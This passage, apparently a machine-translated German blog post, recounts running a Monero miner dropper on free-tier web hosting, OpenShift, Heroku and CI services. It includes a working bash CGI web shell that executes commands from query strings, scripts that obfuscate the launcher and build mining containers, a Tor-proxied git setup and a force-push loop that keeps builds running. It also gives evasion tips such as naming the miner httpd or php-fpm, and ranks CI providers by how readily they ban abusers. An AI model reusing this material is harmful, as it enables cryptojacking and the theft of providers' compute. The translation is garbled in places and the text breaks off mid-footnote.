href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> mit einer http-Anfrage gegen ein auf den Server hochgeladenes Shell-Skript. Diese Art von Schnittstellen sehen Web-Shells aus<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Eine einfache Bash-Web-Shell<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Es ist besser, sich nur auf Built-Ins zu verlassen, da das Forking zusätzlicher Prozesse in Webjails möglicherweise nicht erlaubt ist, aber es ist immer möglich,<code>exec</code> wodurch wir die meisten Befehlszeilen-Dienstprogramme verwenden können. Die meisten Web-Shells sind in anderen Skriptsprachen wie Python oder PHP geschrieben, da Sie sich keine Gedanken über das Forking machen müssen.<p>In einer cpanel-Umgebung ist es besser, einen statischen Namen für den Miner-Prozess zu verwenden, wie z<code>httpd</code> oder<code>php-fpm</code> da<code>cgi</code> basiert auf Multi-Processing, daher sind Server immer mit vielen Prozessen gefüllt, die so genannt werden, obwohl ein aufmerksamer Beobachter dies beachten sollte<em> mehrfädig</em> Verwendungsmuster, das für Sprachen wie Perl, PHP, Ruby oder Python definitiv nicht üblich (oder möglich) ist!<p>Prozesse haben auch standardmäßig ein Zeitlimit (1 Stunde, 1 Tag usw.), dafür verwenden wir einfach einen Cron-Job, der den Dropper neu startet.<p>Dies erforderte viel manuelle Bearbeitung, die cpanel-API, um dies zu automatisieren, ist leider nicht für Endbenutzer verfügbar, daher ist Webhosting ein klobiges und langweiliges Ziel für unseren Miner-Dropper.<h3 id=web_environments><a class=header-anchor href=#web_environments> Webumgebungen</a></h3><p>Es gibt<em> SaaS</em> Anbieter, die einen Webeditor mit einem Container gekoppelt haben, wie z<a href="with a free tier before getting acquired by amazon"> Wolke 9</a> , [überall Code], [Codenvy]. Die Bereitstellung des Droppers hier ist einfach (Sie haben eine vollwertige Umgebung), aber es ist eine Belastung, ihn am Laufen zu halten, da jeder interaktive Webeditor seine Sitzung kurz nach dem Schließen der Webseite beendet und der Container folglich in den Ruhezustand versetzt wird (es sei denn, Sie natürlich bezahlen).<p>Dies zu umgehen kann nur bedeuten, dass wir die Sitzungen offen halten müssen, einige Skripte mit [puppeteer] haben das gewünschte Ergebnis erzielt, aber lange laufende, speicherleckende, aufgeblähte SPAs-Webseiten sind definitiv unattraktiv und nicht heimlich, denn vom Provider-Backend, eine rund um die Uhr geöffnete Sitzung wird definitiv verdächtig aussehen. Tatsächlich sind Webumgebungen auch klobige und langweilige Ziele.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Kostenlose App-Dienste</a></h3><p>Das ist hauptsächlich<a href="when it used to have a free tier"> offene Schicht</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> und [Heroku]. Openshift war als Kubernetes etwas einfach zu implementieren, aber voller Konfigurationsschwankungen. Hier ist ein Auszug:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Dies war das Skript, das verwendet wurde, um den Mining-Container zu erstellen, der eine Yaml-Vorlage erforderte:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Aber der ganze Prozess umfasste ziemlich viele Schritte!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>Im Pseudocode:<ul><li><p>das Projekt erstellen<li><p>Erstellen Sie die Anwendung ohne Bild<li><p>Baue den Mining-Container<li><p>Bereitstellen des Containers mit einer Bereitstellungskonfiguration (Kubernetes-Abstraktion)<li><p>Rollout der Bereitstellung</ul><p>Die<code>build-build</code> Skripte stattdessen erstellt a<em> bauen</em>Container, der für ein paar Stunden am Stück abbauen würde. Builds und normale Pods haben in Openshift separate Ressourcen, daher haben wir beide ausgenutzt. Openshift war insgesamt eine schlechte Erfahrung, da es über 4 verschiedene Versionen ging (vielleicht mehr, ich habe nach einer Weile aufgehört zu verfolgen) und jede von ihnen erforderte Änderungen an den Konfigurationen, sie hatten keine Upgrade-Pfade und alles wurde schnell wiederholt, und es war üblich damit Builds/Pods ins Stocken geraten und nicht Müll gesammelt werden ... sie führten normalerweise ab und zu manuelle Neustarts durch, vielleicht war Kubernetes nur fehlerhaft :)<p>Die Heroku-Konfiguration war etwas einfacher (kein Kubernetes). Abgesehen vom Container-Build, der dem von Openshift ähnlich war, bestand der Rest nur aus zwei cli-Befehlen<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Der Container wurde direkt mit Docker in die Heroku-Registry geschoben.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Die Reibung mit heroku (das zum Zeitpunkt des Schreibens noch immer kostenlos ist) besteht darin, dass Dynos nur 22 Tage pro Monat laufen können, sodass sie jeden Monat etwas manuelles Management erforderten, was wiederum klobig und langweilig ist. Sie haben am Anfang einige Ban-Wellen durchgeführt und dann die Registrierungen über TOR deaktiviert, ich bin mir ziemlich sicher, dass ich die Ursache dafür war.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> CI-Container oder VMs</a></h3><p>Dies waren die synergetischsten Ziele für unsere Pipette. Es gibt viele<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> Unternehmen, von denen viele Investoren Geld verbrennen, indem sie kostenlose Tiers anbieten, in der Hoffnung, Marktanteile im Bereich der technischen Infrastruktur zu gewinnen.<p>Alle diese Dienste bieten unterschiedliche Ressourcen, haben unterschiedliche Konfigurationsanforderungen und werden in unterschiedlichen Umgebungen ausgeführt. Ich habe nie daran gedacht, die Kontoregistrierung zu automatisieren, weil solche Dinge schrecklich zu programmieren sind wie anders als der Rest!). Aus dem Umgang mit Spam können Sie einige Dinge über das Management eines Unternehmens erraten:<ul><li><p>Führt es Ban-Wellen durch? Dann haben sie nicht strenge Richtlinien, Probleme werden manuell und von Fall zu Fall gehandhabt<li><p>Ist eine telefonische Verifizierung erforderlich? Sie wurden schon in der Vergangenheit missbraucht<li><p>Reagieren sie auf starke Ressourcennutzung? Sie haben ein knappes Budget<li><p>Wenden sie Kontobeschränkungen oder Schattenverbote an? Wenn sie ein Shadow-Ban haben, haben sie gemeine Systemadministratoren.</ul><p>Es gibt auch eine philosophische Frage: Wenn ein Dienst Ihnen erlaubt, sein System für lange Zeit zu missbrauchen, bedeutet dies, dass er über eine erstklassige Infrastruktur verfügt, die die Last bewältigen kann, oder einfach nur eine schlechte Kontrolle über sein System hat? Und Sie müssen das Gleichgewicht zwischen Zugänglichkeit und Sicherheit berücksichtigen. Ein zu sicheres System kann die Benutzerbindung verringern.<p>Hier ist eine Tabelle mit einigen Diensten, die ich bereitgestellt habe:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>Aufbau<th style=text-align:center>Leistung<th style=text-align:center>Bannhammer<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>Schlecht<td style=color:#ff0;text-align:center>Mittel<td style=color:#ff0;text-align:center>Mittel<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>gut<td style=color:#ff0;text-align:center>Mittel<td style=color:green;text-align:center>gut<tr><td style=text-align:center>Codeship<td style=color:#ff0;text-align:center>Mittel<td style=color:red;text-align:center>Schlecht<td style=color:#ff0;text-align:center>Mittel<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>Mittel<td style=color:green;text-align:center>gut<td style=color:green;text-align:center>gut<tr><td style=text-align:center>Kreisci<td style=color:red;text-align:center>Schlecht<td style=color:green;text-align:center>gut<td style=color:#ff0;text-align:center>Mittel<tr><td style=text-align:center>Semaphor<td style=color:green;text-align:center>gut<td style=color:green;text-align:center>gut<td style=color:#ff0;text-align:center>Mittel<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>Mittel<td style=color:#ff0;text-align:center>Mittel<td style=color:green;text-align:center>gut<tr><td style=text-align:center>Kai<td style=color:green;text-align:center>gut<td style=color:#ff0;text-align:center>Mittel<td style=color:#ff0;text-align:center>Mittel<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>Schlecht<td style=color:green;text-align:center>gut<td style=color:#ff0;text-align:center>Mittel<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>Mittel<td style=color:#ff0;text-align:center>Mittel<td style=color:red;text-align:center>Schlecht<tr><td style=text-align:center>Azure-Pipelines<td style=color:#ff0;text-align:center>Mittel<td style=color:#ff0;text-align:center>Mittel<td style=color:red;text-align:center>Schlecht<tr><td style=text-align:center>Kontinuierliche php<td style=color:red;text-align:center>Schlecht<td style=color:#ff0;text-align:center>Mittel<td style=color:#ff0;text-align:center>Mittel<tr><td style=text-align:center>Kumpel<td style=color:red;text-align:center>Schlecht<td style=color:red;text-align:center>Schlecht<td style=color:red;text-align:center>Schlecht<tr><td style=text-align:center>Drohne<td style=color:red;text-align:center>Schlecht<td style=color:green;text-align:center>gut<td style=color:red;text-align:center>Schlecht<tr><td style=text-align:center>Anerkenner<td style=color:red;text-align:center>Schlecht<td style=color:#ff0;text-align:center>Mittel<td style=color:red;text-align:center>Schlecht<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>Schlecht<td style=color:green;text-align:center>gut<td style=color:#ff0;text-align:center>Mittel<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>Schlecht<td style=color:green;text-align:center>gut<td style=color:red;text-align:center>Schlecht</table><p>In diesem Zusammenhang ist a<span style=color:green> gut</span> Konfiguration bedeutet, dass die Konfiguration nicht viel Zeit in Anspruch nahm<code>ci</code> Job für den Mining-Prozess (wie alle Dienste, die auf ein Web-Dashboard anstelle einer Repository-Punktdatei angewiesen sind, waren eine lästige Pflicht), a<span style=color:red> Schlecht</span><code>ban-hammer</code> bedeutet, dass es schwierig war, sich für den Dienst zu registrieren, oder dass Konten aggressiver gesperrt werden würden.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> erfordert, ein Projekt einzurichten, die Umgebung, die Zielarchitektur, den Ausführungsprozess und andere Dinge abzuleiten, es war sehr zeitaufwendig, einen Build einzurichten, so dass er in der Konfiguration eine schlechte Bewertung erhielt.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Kontinuierliche php</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Kumpel</a> , [Codefresh] hatte auch viele manuelle, nicht deklarative Konfigurationsschritte.<p>Dienste wie [Azure-Pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Kumpel</a> wendet Shadow-Bans auf die Konten an, Shadow-Bans sind schlecht, da Sie raten können, ob mit Ihrer Konfiguration etwas nicht stimmt oder nicht. Bei einigen Diensten können Sie den Grund für das Verbot erraten (ziemlich viel Zeit hat Ihr Build gedauert oder Sie haben in kurzer Zeit zu oft gebaut), bei anderen wie [Azure-Pipelines] nehme ich an, dass sie eine Art Fingerabdruck verwendet haben an die Benutzer-Repositories, da Verbote auch ohne Ressourcenmissbrauch durchkamen, Azure und Vercel ebenfalls eingeschränkt<code>DNS</code> Zugang innerhalb öffentlicher Baumaschinen, so dass zusätzliche Reibungspunkte entstanden, die mit einem Ad-hoc-Tunnel überwunden werden mussten.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Drohne</a> gab Zugriff auf einen ganzen Prozessor mit 16+ Kernen, wurde aber nach 2 Builds gesperrt<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Codeship</a> bietet auch Zugriff auf leistungsstarke Build-Hosts und wurde nicht so aggressiv wie Drohnen gebannt.<p>Meine Lieblingsdienste nicht wegen der Rentabilität, sondern wegen der Einfachheit und Bequemlichkeit (auch bei anderen Projekten) waren<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semaphor</a> und<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-Hub</a>. Travis ist wie die Standard-CI und sehr flexibel, Semaphore ist die einzige<code>DSL</code> zum<code>CI</code> das sah jedoch zugänglich und gut aus, anstatt nur eine endlose Abfolge von spaghettierten Kontrollkästchen wie bei anderen UIs, und Docker nur für die Einfachheit, Dockerfiles Builds zuzuordnen.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Erstellt Konfigurationen</a></h3><p>Die Builds wurden entweder durch Cron-Jobs von Webdiensten oder durch Git-Commits ausgelöst. Sie mussten also eine Menge von Zugriffstoken oder SSH-Schlüsseln im Auge behalten, um alle Git-Commits zu verwalten. Es war auch wichtig, Commits nicht zu viel zu spammen und Proxys zu verwenden, wenn Sie an die Repositories pushen, die git konfigurieren:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Mit git-Hosting-Diensten war github derjenige, der Verbote gründlicher behandelte, aber sie wurden nur nach Missbrauchsmeldungen von CI-Diensten-Administratoren ausgeführt. Ich habe noch nie eine Sperre für ein Bitbucket-Konto erhalten. Um Git-Commits zu (erzwingen) zu pushen, haben wir eine lange laufende Schleife, die das Git-Repository neu taggt:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Es ist möglich, dass Github auf diese Weise erzwungenes Pushen nicht sehr mag und ein Grund dafür sein könnte, dass Konten gemeldet werden. Die Tagger-Funktion, die damit beauftragt ist, andere Commits zu erzwingen, verwendet eine Website (die Sie ganz einfach nachschlagen können), die einige zufällige Commits liefert. Ich bin mir nicht sicher, wie sehr das hilft, da der Inhalt der Commits für meinen Fall offensichtlich verdächtig ist. Und es hat mich auch einmal in den Arsch gebissen, da die von diesem Befehl zurückgegebenen Commits Schimpfwörter enthalten können, wurde einer meiner Commits von einem Twitter-Bot abgeholt, der Git-Commits mit Schimpfwörtern verfolgt! Ich habe nach dem Vorfall eine schwarze Liste für schlechte Wörter hinzugefügt.<p>Ich habe mich nicht wirklich mit verschleierten Git-Commits und verschleierten Git-Repositorys befasst. Der einzige Fall, in dem ich ein aufwändigeres Repository verwendet habe, war bei Bitrise, da man keinen Build einrichten konnte, wenn das System eine Umgebung (wie mobile Apps) nicht erkannte, aber selbst dann gab es keine Rotation und es war immer gleich Repository, recht leicht zu erkennen.<p>Insgesamt, wenn ich eine Glockenkurve um den optimalen Zeitpunkt für meine Mine zeichnen müsste<em> ohne</em>Das Sperren von Konten für alle getesteten Dienste würde bei einer Center-Build-Dauer von etwa einer Stunde einmal pro Tag erfolgen. Bei CPU-Kernen erwarten die meisten Dienste, abgesehen von ein paar Ausreißern (wie Drohnen), dass Sie die volle Menge der Ihnen zur Verfügung gestellten Ressourcen nutzen, da Builds in VMs oder Containern mit eingeschränkten Ressourcen ausgeführt werden ... und die Kompilierung normalerweise eine Aufgabe ist, die sättigt die CPU, hat also keine statistische Relevanz. Intuitiv ist ein Build pro Tag das, was der durchschnittliche Entwickler tun würde. Sie sollten also mit gehissten Flaggen rechnen, wenn Sie vom Mittelwert abweichen, und das Drängen auf Missbrauch endet nie gut.<h2 id=conclusions><a class=header-anchor href=#conclusions> Schlussfolgerungen</a></h2><p>War es das wert? Die Networking-Teile waren definitiv interessant, der Umgang mit Account-Registrierungen war offensichtlich der schlimmste Teil, schließlich klickt niemand gerne endlose Bestätigungs-E-Mails und wiederholte nervtötende UI-Verfahren. Spam-Automatisierungssoftware zu schreiben ist auch langweilig (weil Sie meistens in dummen APIs herumstochern), und mit dieser Annahme (und der Tatsache, dass dies nie etwas Ernstes war) habe ich es nie in Betracht gezogen. War es profitabel? Auf seinem Höhepunkt erreichte es so etwas wie<code>300$</code> pro Monat, vielleicht genug für einen Venezianer, nicht wirklich für mich :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> der mürrische Systemadministrator</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>Auch wenn dies viele Datenschutzannahmen brechen würde, werfen die meisten von ihnen sicher nur einen Blick hinein, wenn ein bestehendes Problem auftritt, aber dies ist nur ein Problem für containerbasierte Laufzeiten, während VMs so ziemlich Blackboxen sind.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>Der in den Monero-Knoten eingebaute Miner hat einige Arbeit geleistet, um ihn hintergrundfreundlicher zu machen, aber die Verteilung von xmrig war nie auf die Hintergrundfreundlichkeit ausgerichtet.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>Einige Pools bieten unterschiedliche Schwierigkeiten an verschiedenen Verbindungsports und neigen dazu, die Job-Schwierigkeit an die vom Miner übermittelten Aktien auszurichten, aber die Granularität des Proxys war noch bequemer, da sie Pools verhindern würde<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> einschließen</a> (obwohl wir nie wirklich Pools gewechselt haben).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>es war nicht glücklich, als die config plötzlich auftauchte und aus dem Dateisystem verschwand</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Wir reden nicht über die<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> Stratum-Protokoll</a> da wir uns einfach mit dem beschäftigen müssen, was umgesetzt wird in<em> beide</em> der Pool und der Bergmann ... was normalerweise das absolute Minimum ist und möglicherweise mit nicht standardmäßigen Erweiterungen.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>geh niemals voll durch :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Ich habe nicht untersucht, was passiert, wenn ein Prozess zur Laufzeit zusätzliche Funktionalität lädt, da der Kernel im Speicherlayout der ausführbaren Datei nach der Adresse sucht, die auf das Dateisystem zugreifen und möglicherweise einen Absturz verursachen würde.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Die Grenzen sind willkürlich, die CPU-Zeit beträgt weniger als eine Sekunde, der Arbeitsspeicher beträgt weniger als 128 MB, ausgehende Verbindungen werden blockiert.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>Mit etwas Geduld können Sie auch eine vollständige ssh-Instanz über eine Umgebung ausführen, die um Ihren cpanel-Kontobereich herum gebootet wird.<em> ohne</em> Zugriff auf das in cpanel integrierte SSH, das von Hosting-Providern in der Regel deaktiviert wird.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift stieg von einer kostenlosen 1-Jahres-Stufe auf 3 Monate auf 1 Monat und erforderte eine Telefonauthentifizierung. Ich kann garantieren, dass ich nicht der einzige war, der ihre Dienste missbrauchte.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Heroku Free-Tier-Container sind ziemlich großzügig in Bezug auf Ressourcen, sie bieten 4c/8t (virtuelle) CPU, viel RAM und großen Speicher (der jedoch nicht dauerhaft ist und beim Herunterfahren des Prüfstands verworfen wird).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Sie fügen viel 